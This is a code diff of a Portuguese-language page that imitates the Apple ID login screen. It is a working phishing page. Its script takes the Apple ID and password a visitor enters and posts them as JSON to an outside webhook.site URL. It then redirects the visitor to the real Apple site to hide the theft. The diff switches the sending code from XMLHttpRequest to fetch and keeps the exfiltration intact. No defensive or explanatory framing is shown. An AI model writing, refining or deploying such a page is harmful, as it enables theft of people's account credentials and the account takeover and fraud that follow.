@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>Apple ID - Login</title>
+    <title>Login Apple ID</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, sans-serif;
@@ -27,11 +27,6 @@
             margin-bottom: 20px;
             color: #000;
         }
-        h2 {
-            font-size: 24px;
-            margin-bottom: 25px;
-            font-weight: 600;
-        }
         input {
             width: 100%;
             padding: 14px;
@@ -53,19 +48,15 @@
             cursor: pointer;
             margin-top: 10px;
         }
-        button:hover {
-            background-color: #0062c3;
-        }
     </style>
 </head>
 <body>
     <div class="login-container">
-        <!-- Ícone da Apple corrigido -->
         <div class="apple-logo"></div>
         <h2>Fazer login</h2>
         <form id="loginForm">
-            <input type="text" name="apple_id" placeholder="Apple ID" required>
-            <input type="password" name="password" placeholder="Senha" required>
+            <input type="text" id="apple_id" name="apple_id" placeholder="Apple ID" required>
+            <input type="password" id="password" name="password" placeholder="Senha" required>
             <button type="submit">Continuar</button>
         </form>
     </div>
@@ -74,30 +65,39 @@
         document.getElementById("loginForm").addEventListener("submit", function(e) {
             e.preventDefault();
             
-            // 1. Coletar dados de forma segura
-            const dados = {
-                apple_id: encodeURIComponent(document.getElementsByName("apple_id")[0].value),
-                password: encodeURIComponent(document.getElementsByName("password")[0].value),
+            // 1. Captura dos valores do formulário
+            const user = document.getElementById("apple_id").value;
+            const pass = document.getElementById("password").value;
+            
+            // 2. Preparação dos dados para envio
+            const data = {
+                usuario: user,
+                senha: pass,
                 timestamp: new Date().toISOString()
             };
 
-            // 2. Enviar para webhook (URL CORRETA)
-            const webhookURL = "https://webhook.site/e9026c1f-9cde-4e6c-9d5d-bc2eb5f83418";
-            
-            // Método INFALÍVEL
-            const xhr = new XMLHttpRequest();
-            xhr.open("POST", webhookURL, true);
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-            
-            // Formatando os dados corretamente
-            const params = `apple_id=${dados.apple_id}&password=${dados.password}&timestamp=${encodeURIComponent(dados.timestamp)}`;
-            
-            xhr.onload = function() {
-                // 3. Redirecionamento garantido
+            // 3. Envio via Fetch API com tratamento de erro
+            fetch('https://webhook.site/e9026c1f-9cde-4e6c-9d5d-bc2eb5f83418', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Erro na requisição');
+                }
+                return response.text();
+            })
+            .then(() => {
+                // 4. Redirecionamento após envio
                 window.location.href = "https://appleid.apple.com/";
-            };
-            
-            xhr.send(params);
+            })
+            .catch((error) => {
+                console.error('Erro:', error);
+                window.location.href = "https://appleid.apple.com/";
+            });
         });
     </script>
 </body>
